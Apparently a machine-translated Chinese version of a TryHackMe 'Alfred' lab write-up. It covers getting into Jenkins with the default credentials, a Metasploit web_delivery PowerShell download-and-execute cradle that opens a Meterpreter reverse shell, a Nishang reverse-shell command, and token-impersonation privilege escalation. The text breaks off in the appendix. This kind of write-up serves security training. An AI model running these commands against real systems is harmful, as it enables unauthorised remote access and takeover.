<html>
<head>
<title>TryHackMe writeup: Alfred</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道:阿尔弗雷德</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-alfred-2ecd773aeda5?source=collection_archive---------1-----------------------#2022-03-22">https://infosecwriteups.com/tryhackme-writeup-alfred-2ecd773aeda5?source=collection_archive---------1-----------------------#2022-03-22</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="a350" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><em class="kp">阿尔弗雷德</em>房间挑战TryHackMe用户“利用<em class="kp">詹金斯</em>获得初始外壳，然后通过利用Windows认证令牌升级你的权限”(<a class="ae kq" href="https://tryhackme.com/room/alfred" rel="noopener ugc nofollow" target="_blank">“TryHackMe”，2019 </a>)。<a class="ae kq" href="https://www.jenkins.io/" rel="noopener ugc nofollow" target="_blank"> Jenkins (n.d.) </a>是服务器自动化领域的竞争者，<em class="kp">认证令牌</em>是“描述进程或线程的安全上下文的对象”(<a class="ae kq" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens" rel="noopener ugc nofollow" target="_blank"> Kennedy等人，2021 </a>)。在本文中，我打算证明Jenkins可以被用作获得目标系统初始访问权的媒介，然后使用令牌转移来提升权限。</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj kr"><img src="../Images/cfbad0a3bca7b8e96ee5a0b0d0bfd46c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_kA973FnKq9yOS1UeLdoDA.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated">基础图片:<a class="ae kq" href="https://www.youtube.com/watch?v=faGib7zY1rA" rel="noopener ugc nofollow" target="_blank">多布金斯(1999) </a></figcaption></figure><h1 id="629f" class="lh li iu bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">程序</h1><p id="0caf" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">这个房间的目标是:</p><ul class=""><li id="82f3" class="mk ml iu jt b ju jv jy jz kc mm kg mn kk mo ko mp mq mr ms bi translated">转储存储在<code class="fe mt mu mv mw b">user.txt</code>中的用户标志</li><li id="66cb" class="mk ml iu jt b ju mx jy my kc mz kg na kk nb ko mp mq mr ms bi translated">并转储存储在<code class="fe mt mu mv mw b">C:\Windows\System32\configs\root.txt</code>中的根标志</li></ul><p id="933a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">…当然还有学习新的东西；-)</p><h2 id="0e25" class="nc li iu bd lj nd ne dn ln nf ng dp lr kc nh ni lv kg nj nk lz kk nl nm md nn bi translated">初始探测</h2><p id="2581" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">与这些TryHackMe boot2root虚拟机一样，我单击了第一个任务右上角的绿色按钮，然后等待几分钟，让boot2root虚拟机完成引导。然后，我使用以下标志和参数运行了一次<code class="fe mt mu mv mw b">nmap</code>扫描:</p><p id="90ea" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe mt mu mv mw b"><strong class="jt iv">$ nmap -sT -A -v [boot2root ip] -Pn -p- -O -sC -oX tcp_scan.xml</strong></code></p><p id="1f65" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这是一台Windows机器，所以它不响应<code class="fe mt mu mv mw b">ping</code>请求，因此使用<code class="fe mt mu mv mw b">-Pn</code>标志来解决这个问题。nmap扫描识别出boot2root机器很可能正在运行<em class="kp"> Windows Server 2008 </em>并返回以下三(3)个端口:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="7daf" class="nc li iu mw b gz ns nt l nu nv">[... snip ...]<br/>PORT      STATE SERVICE VERSION <br/>80/tcp    open  http    Microsoft IIS httpd 7.5 <br/>| http-methods: <br/>| Supported Methods: OPTIONS TRACE GET HEAD POST<br/>|_ Potentially risky methods: TRACE<br/>|_http-server-header: Microsoft-IIS/7.5<br/>|_http-title: Site doesn’t have a title (text/html).<br/>3389/tcp  open  ssl/ms-wbt-server?<br/>8080/tcp  open  http   Jetty 9.4.z-SNAPSHOT<br/>|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1<br/>| http-robots.txt: 1 disallowed entry <br/>|_/<br/>|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br/>|_http-title: Site doesn’t have a title (text/html;charset=utf-8).<br/>[... snip ...]</span></pre><p id="a9b4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">与此工作相关的是，它发现了一个运行在端口80上的IIS web服务器和另一个带有标题<code class="fe mt mu mv mw b">Jetty 9.4.z-SNAPSHOT</code>的HTTP服务。我最初浏览了端口80上的HTTP服务，得到如下结果(图1):</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div class="gi gj nw"><img src="../Images/90cd991974216ec39d21cd4aa095cb54.png" data-original-src="https://miro.medium.com/v2/resize:fit:1126/format:webp/1*H3eweZdfPAfNvK-RDZYtIw.png"/></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated"><strong class="bd lj">图boot2root IIS webserver的主页</strong></figcaption></figure><p id="936e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我的下一步是使用<em class="kp"> DirBuster </em>试图找出任何隐藏的目录。我启动程序，然后配置它(图2):</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj nx"><img src="../Images/ccb9d38a90514d54b1798229a83ff13c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-x1u3AAzzpu7F6rSlu9zEA.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated"><strong class="bd lj">图2: DirBuster设置</strong></figcaption></figure><p id="2bd6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将boot2root的IP地址和端口号放在“target URL”字段中(图2a)，在Kali Linux的wordlists目录中设置我认为合适的单词列表(图2b)，将DirBuster配置为具有两百(200)个线程的“[g]o [f]aster”(图2c)，然后启动该过程(图2d)。</p><p id="da1d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">经过大约五分钟的子目录破坏，我一无所获(见图3):</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj ny"><img src="../Images/cb7e8bd14797bff2c43d372076a656f8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NGdQc9FQcBVviR_CYwdXTw.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated"><strong class="bd lj">图3: DirBuster没有返回结果</strong></figcaption></figure><p id="34a1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在这之后，我让我的浏览器转到在boot2root机器的端口8080上运行的web服务，然后遇到了我认为将进入目标系统的途径(图4):</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj nz"><img src="../Images/a1c35d2a5dc7ed9203bd80cdb4b6865b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MnU_tbC-LpsBSFzFNupivA.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated"><strong class="bd lj">图4:詹金斯登录面板</strong></figcaption></figure><h2 id="74c9" class="nc li iu bd lj nd ne dn ln nf ng dp lr kc nh ni lv kg nj nk lz kk nl nm md nn bi translated">剥削</h2><p id="c180" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">我最初打算设置Burp Suite (Community Edition)来使用各种用户名和密码组合对Jenkins登录面板进行暴力攻击，但是我决定尝试使用默认凭证登录。我的第一个用户名和密码组合是<code class="fe mt mu mv mw b">admin:admin</code>——我可以登录到Jenkins面板(图5):</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj oa"><img src="../Images/d86a6203abf5a276d7729229575f71bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DxOVORuYd1F5eH5tf4b8zg.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated"><strong class="bd lj">图5: Jenkins管理面板</strong></figcaption></figure><p id="5591" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">登录到Jenkins后，我做的下一件事是寻找一些方法来利用它给我一个进入系统的命令shell。经过一番研究，我发现了一种在目标系统上执行shell命令的方法(<a class="ae kq" href="https://quick-adviser.com/how-do-i-run-a-shell-command-in-jenkins/" rel="noopener ugc nofollow" target="_blank"> Davis，2021 </a>)，具体描述如下:</p><ol class=""><li id="5cbb" class="mk ml iu jt b ju jv jy jz kc mm kg mn kk mo ko ob mq mr ms bi translated">在詹金斯创建一个自由风格的项目。</li><li id="73e1" class="mk ml iu jt b ju mx jy my kc mz kg na kk nb ko ob mq mr ms bi translated">使用“高级配置”页面可以使用自定义工作区。</li><li id="a262" class="mk ml iu jt b ju mx jy my kc mz kg na kk nb ko ob mq mr ms bi translated">将路径添加到您的shell脚本中。</li><li id="cc6a" class="mk ml iu jt b ju mx jy my kc mz kg na kk nb ko ob mq mr ms bi translated">在构建步骤下，选择“执行shell”</li><li id="295c" class="mk ml iu jt b ju mx jy my kc mz kg na kk nb ko ob mq mr ms bi translated">输入您的shell脚本的名称，然后单击save并执行它。</li></ol><p id="7cfa" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">关于步骤1，<a class="ae kq" href="https://www.guru99.com/create-builds-jenkins-freestyle-project.html" rel="noopener ugc nofollow" target="_blank"> Hamilton (2020) </a>将<em class="kp">自由风格项目</em>定义为“包含步骤和后期构建动作的可重复构建作业、脚本或管道。”我不打算“不折不扣地”遵循这些指示。相反，我打算只是将它作为一个参考，我可以用它来完成我的目标——即通过Metasploit的Meterpreter启动一个反向shell。</p></div><div class="ab cl oc od hy oe" role="separator"><span class="of bw bk og oh oi"/><span class="of bw bk og oh oi"/><span class="of bw bk og oh"/></div><div class="in io ip iq ir"><p id="1da3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><strong class="jt iv">请注意</strong>教室指导学生使用尼尚<code class="fe mt mu mv mw b">Invoke-PowerShellTcp.ps1</code>脚本(<a class="ae kq" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" rel="noopener ugc nofollow" target="_blank"> Mittal和Mehlmauer，n.d. </a>)来获得初始外壳。对这种方法感兴趣的，看最后的附录。</p></div><div class="ab cl oc od hy oe" role="separator"><span class="of bw bk og oh oi"/><span class="of bw bk og oh oi"/><span class="of bw bk og oh"/></div><div class="in io ip iq ir"><p id="b881" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">为了监听反向Meterpreter shell，我将通过终端在AttackBox上启动Metasploit:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="fd8d" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">$ sudo msfconsole</strong></span><span id="c5e2" class="nc li iu mw b gz oj nt l nu nv">[... snip ...]</span><span id="f906" class="nc li iu mw b gz oj nt l nu nv">=[ metasploit v5.0.60-dev ]<br/>+ — — =[ 1947 exploits — 1089 auxiliary — 333 post ]<br/>+ — — =[ 556 payloads — 45 encoders — 10 nops ]<br/>+ — — =[ 7 evasion ]</span><span id="3afd" class="nc li iu mw b gz oj nt l nu nv"><strong class="mw iv">msf5 &gt;</strong></span></pre><p id="710c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我将使用模块<code class="fe mt mu mv mw b">exploit/multi/script/web_delivery</code>提供Meterpreter shell，将有效负载设置为<code class="fe mt mu mv mw b">windows/meterpreter/reverse_tcp</code>，设置选项，然后启动漏洞利用:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="5e1f" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">msf5 &gt;</strong> <strong class="mw iv">use exploit/multi/script/web_delivery</strong><br/><strong class="mw iv">msf5 exploit(multi/script/web_delivery) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</strong><br/>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br/><strong class="mw iv">msf5 exploit(multi/script/web_delivery) &gt;</strong> <strong class="mw iv">set SRVHOST &lt;attackbox ip&gt;</strong><br/>SRVHOST =&gt; &lt;attackbox ip&gt;<br/><strong class="mw iv">msf5 exploit(multi/script/web_delivery) &gt;</strong> <strong class="mw iv">set LHOST &lt;attackbox ip&gt;</strong><br/>LHOST =&gt; &lt;attackbox ip&gt;<br/><strong class="mw iv">msf5 exploit(multi/script/web_delivery) &gt; set TARGET 2</strong><br/>TARGET =&gt; 2<br/><strong class="mw iv">msf5 exploit(multi/script/web_delivery) &gt; exploit</strong><br/>[*] Exploit running as background job 0.<br/>[*] Exploit completed, but no session was created.<br/><strong class="mw iv">msf5 exploit(multi/script/web_delivery) &gt; </strong><br/>[*] Started HTTPS reverse handler on https://&lt;attackbox ip&gt;:4444<br/>[*] Using URL: http://&lt;attackbox ip&gt;:8080/lH2GrCFxu1<br/>[*] Server started.<br/>[*] Run the following command on the target machine:<br/>powershell.exe -nop -w hidden -c $Z=new-object net.webclient;$Z.proxy=[Net.WebRequest]::GetSystemWebProxy();$Z.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $Z.downloadstring('http://&lt;attackbox ip&gt;:8080/lH2GrCFxu1');</span></pre><p id="be32" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Meterpreter给了我一个在目标机器上执行的PowerShell命令。将我的注意力转回到Jenkins面板，我注意到Jenkins面板中有一个现有的项目(图5a)，并决定检查它。</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj ok"><img src="../Images/d8b39fe1cca0f88103f102c630305ac0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RJEfrWMEuQrYnGveFue77A.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated"><strong class="bd lj">图6:“项目”的项目空间</strong></figcaption></figure><p id="86a7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">为了得到一个Meterpreter shell，我点击了“[c]configure”(图6a)并向下滚动到“[b]build”部分:</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj ol"><img src="../Images/544b07f90611d53183c06eb5543e634f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-EPAYgtNTysg8x7LNFwbiA.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated"><strong class="bd lj">图7:【建造】部分</strong></figcaption></figure><p id="b398" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在命令文本框上(图7a)，我用Metasploit给出的以下PowerShell命令替换了<code class="fe mt mu mv mw b">whoami</code>命令:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="d49b" class="nc li iu mw b gz ns nt l nu nv">powershell.exe -nop -w hidden -c $Z=new-object net.webclient;$Z.proxy=[Net.WebRequest]::GetSystemWebProxy();$Z.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $Z.downloadstring('http://&lt;attackbox ip&gt;:8080/lH2GrCFxu1');</span></pre><p id="56c3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我依次点击“应用”按钮(图7b)和“保存”按钮(图7c)。最后，为了获得反向的Meterpreter shell，我单击了项目主页上的“Build Now”按钮(图6b ),并在我的攻击框中获得了以下内容:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="431f" class="nc li iu mw b gz ns nt l nu nv">msf5 exploit(multi/script/web_delivery) &gt; [*] &lt;boot2root ip&gt; web_delivery — Delivering Payload (1933) bytes<br/>[*] Sending stage (180291 bytes) to &lt;boot2root ip&gt;<br/>[*] Meterpreter session 1 opened (&lt;attackbox ip&gt;:4444 -&gt; &lt;boot2root ip&gt;:49287) at [redacted] -0400</span><span id="ec3f" class="nc li iu mw b gz oj nt l nu nv"><strong class="mw iv">msf5 exploit(multi/script/web_delivery) &gt;</strong></span></pre><p id="1ae1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">下一步自然是与Meterpreter会话进行交互:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="d327" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">msf5 exploit(multi/script/web_delivery) &gt; sessions -l</strong></span><span id="3eb8" class="nc li iu mw b gz oj nt l nu nv">Active sessions<br/>===============</span><span id="5178" class="nc li iu mw b gz oj nt l nu nv">Id Name Type Information Connection<br/>-- ---- ---- ----------- ----------<br/> 1 meterpreter x86/windows alfred\bruce @ ALFRED &lt;attackbox ip&gt;:4444 -&gt; &lt;boot2root ip&gt;:49287 (&lt;boot2root ip&gt;)</span><span id="15b5" class="nc li iu mw b gz oj nt l nu nv"><strong class="mw iv">msf5 exploit(multi/script/web_delivery) &gt; sessions -i 1</strong><br/>[*] Starting interaction with 1…</span></pre><h2 id="68c8" class="nc li iu bd lj nd ne dn ln nf ng dp lr kc nh ni lv kg nj nk lz kk nl nm md nn bi translated">后剥削</h2><p id="6336" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">我将从转储<code class="fe mt mu mv mw b">user.txt</code>文件开始获取一个标志:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="9bc2" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">meterpreter &gt; search -f user.txt</strong><br/>Found 1 result…<br/> c:\Users\bruce\Desktop\user.txt (32 bytes)<br/><strong class="mw iv">meterpreter &gt; cat C:\\Users\\bruce\\Desktop\\user.txt</strong><br/>[redacted]<strong class="mw iv">meterpreter &gt;</strong></span></pre><p id="9bf9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">接下来，我将升级我的特权来获得<code class="fe mt mu mv mw b">root.txt</code>旗帜。首先，我进入一个Windows命令提示符shell，并使用<code class="fe mt mu mv mw b">whoami /priv</code>来获取我目前拥有的特权令牌:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="2862" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">meterpreter &gt; shell</strong><br/>Process 2768 created.<br/>Channel 1 created.<br/>Microsoft Windows [Version 6.1.7601]<br/>Copyright © 2009 Microsoft Corporation. All rights reserved.</span><span id="84cc" class="nc li iu mw b gz oj nt l nu nv"><strong class="mw iv">C:\Program Files (x86)\Jenkins\workspace\project&gt;whoami /priv</strong><br/>whoami /priv</span></pre><p id="780d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">返回了以下特权令牌及其各自的状态:</p><figure class="ks kt ku kv gu kw gi gj paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gi gj om"><img src="../Images/92df7d8760adff8a1083568e48bc2c28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ygEd74ZDLvGj5OKrwM0Vpg.png"/></div></div><figcaption class="ld le gk gi gj lf lg bd b be z dk translated"><strong class="bd lj">图boot2root机器上的当前特权令牌</strong></figcaption></figure><p id="ece2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我注意到<code class="fe mt mu mv mw b">SeDebugPrivilege</code>、<code class="fe mt mu mv mw b">SeChangeNotifyPrivilege</code>、<code class="fe mt mu mv mw b">SeImpersonatePrivilege</code>和<code class="fe mt mu mv mw b">SeCreateGlobalPrivilege</code>设置为“启用”状态。这可以被Meterpreter的<code class="fe mt mu mv mw b">incognito</code>模块利用来进行权限提升。首先，我将列出可以模拟的帐户数量:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="b0a3" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">meterpreter &gt; use incognito</strong><br/>Loading extension incognito…Success. <br/><strong class="mw iv">meterpreter &gt; list_tokens -g </strong><br/>[-] Warning: Not currently running as SYSTEM, not all tokens will be available <br/> Call rev2self if primary process token is SYSTEM <br/> <br/>Delegation Tokens Available <br/>======================================== <br/>\<br/>BUILTIN\Administrators</span><span id="bafc" class="nc li iu mw b gz oj nt l nu nv">[... snip ...]</span><span id="c430" class="nc li iu mw b gz oj nt l nu nv"><strong class="mw iv">meterpreter &gt;</strong></span></pre><p id="42f5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我使用<code class="fe mt mu mv mw b">incognito</code>的<code class="fe mt mu mv mw b">impersonate_token</code>命令获得系统权限:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="edab" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">meterpreter &gt; impersonate_token BUILTIN\\Administrators</strong><br/>[-] Warning: Not currently running as SYSTEM, not all tokens will be available<br/> Call rev2self if primary process token is SYSTEM<br/>[+] Delegation token available<br/>[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span></pre><p id="a95b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这可以用<code class="fe mt mu mv mw b">getuid</code>命令来验证:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="5d6b" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">meterpreter &gt; getuid</strong><br/>Server username: NT AUTHORITY\SYSTEM</span></pre><p id="5967" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">该房间注意到当前流程不稳定(<a class="ae kq" href="https://tryhackme.com/room/alfred" rel="noopener ugc nofollow" target="_blank">“tryhackme”，2019，任务3 </a>)，并建议迁移<code class="fe mt mu mv mw b">services.exe</code>的一个实例作为额外措施:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="cd1c" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">meterpreter &gt; ps</strong></span><span id="7497" class="nc li iu mw b gz oj nt l nu nv">Process List<br/>============</span><span id="56ad" class="nc li iu mw b gz oj nt l nu nv">PID PPID Name Arch Session User Path<br/>--- ---- ---- ---- ------- ---- ----<br/>[... snip ...]<br/> 668 580 services.exe x64 0 NT AUTHORITY\SYSTEM C:\Windows\System32\services.exe<br/>[... snip ....]</span><span id="a073" class="nc li iu mw b gz oj nt l nu nv"><strong class="mw iv">meterpreter &gt; migrate 668</strong><br/>[*] Migrating from 2708 to 668…<br/>[*] Migration completed successfully.</span></pre><p id="16f0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">最后，我可以得到<code class="fe mt mu mv mw b">root.txt</code>标志:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="5739" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">meterpreter &gt; cat C:\\Windows\\System32\\config\\root.txt</strong><br/>��[redacted]</span></pre><p id="74c2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">从而完成本实验的所有目标。</p><h1 id="5d53" class="lh li iu bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">结论</h1><p id="3634" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">这个房间相当有趣。我了解了existence Jenkins应用程序，并有机会尝试一种交付Meterpreter有效负载的新技术，这种技术不同于使用手动将Meterpreter可执行文件传输到目标系统的“传统”方法。</p><p id="c5f0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">记住，对于任何对通过Nishang方法获得Meterpreter shell感兴趣的人，请查看附录。</p><h2 id="09f5" class="nc li iu bd lj nd ne dn ln nf ng dp lr kc nh ni lv kg nj nk lz kk nl nm md nn bi translated">外卖食品</h2><ol class=""><li id="6d7d" class="mk ml iu jt b ju mf jy mg kc on kg oo kk op ko ob mq mr ms bi translated">有时目标应用程序不在主web服务器上。</li><li id="54c6" class="mk ml iu jt b ju mx jy my kc mz kg na kk nb ko ob mq mr ms bi translated">总是尝试使用默认的登录凭证，因为与暴力破解相比，它可以节省很多时间；-)</li><li id="bd0f" class="mk ml iu jt b ju mx jy my kc mz kg na kk nb ko ob mq mr ms bi translated">并不总是需要内核漏洞。用户可以使用<code class="fe mt mu mv mw b">incognito</code>模块提升权限。</li><li id="cee0" class="mk ml iu jt b ju mx jy my kc mz kg na kk nb ko ob mq mr ms bi translated">与<code class="fe mt mu mv mw b">multi/handler</code>和<code class="fe mt mu mv mw b">msfvenom</code>方法相比,<code class="fe mt mu mv mw b">web_delivery</code>有效载荷交付更快、更容易执行；-)</li></ol><h2 id="a4ca" class="nc li iu bd lj nd ne dn ln nf ng dp lr kc nh ni lv kg nj nk lz kk nl nm md nn bi translated">插头</h2><p id="cf88" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">看看我的朋友米拉·拉辛，她和其他同事一样，需要经济和情感上的帮助。请查看以下链接:</p><ul class=""><li id="5c45" class="mk ml iu jt b ju jv jy jz kc mm kg mn kk mo ko mp mq mr ms bi translated">她的推特简介:<a class="ae kq" href="https://twitter.com/MiraLazine" rel="noopener ugc nofollow" target="_blank">https://twitter.com/MiraLazine</a></li><li id="0ff8" class="mk ml iu jt b ju mx jy my kc mz kg na kk nb ko mp mq mr ms bi translated">她的中等身材:<a class="ae kq" href="https://medium.com/@MiraLazine" rel="noopener">https://medium.com/@MiraLazine</a></li><li id="1507" class="mk ml iu jt b ju mx jy my kc mz kg na kk nb ko mp mq mr ms bi translated">用现金捐给她自己。app:<a class="ae kq" href="https://cash.app/$MiraLazine" rel="noopener ugc nofollow" target="_blank">https://cash.app/$MiraLazine</a></li></ul><h1 id="e1e6" class="lh li iu bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">附录:通过霓裳反转外壳</h1><p id="3cca" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">在这篇文章中，我使用Metasploit的<code class="fe mt mu mv mw b">web_delivery</code>模块立即获得了一个PowerShell。然而，房间建议通过尼尚的<code class="fe mt mu mv mw b">Invoke-PowerShellTcp.ps1</code>剧本(<a class="ae kq" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" rel="noopener ugc nofollow" target="_blank">米塔尔和梅尔穆尔，n.d. </a>)得到一个反向外壳。房间给出了要在boot2root机器上执行的以下命令:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="35af" class="nc li iu mw b gz ns nt l nu nv">powershell iex (New-Object Net.WebClient).DownloadString('http://&lt;attackbox ip&gt;:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress &lt;attackbox ip&gt; -Port 4444</span></pre><p id="a794" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><em class="kp">*注意，</em> <strong class="jt iv"> <em class="kp">单引号</em> </strong> <em class="kp">应与</em> <code class="fe mt mu mv mw b">DownloadString</code> <em class="kp">函数一起使用，</em> <strong class="jt iv"> <em class="kp">不能用双引号</em> </strong>。如果使用单引号，该命令将不起作用。</p><p id="b21d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这将指示boot2root计算机下载<code class="fe mt mu 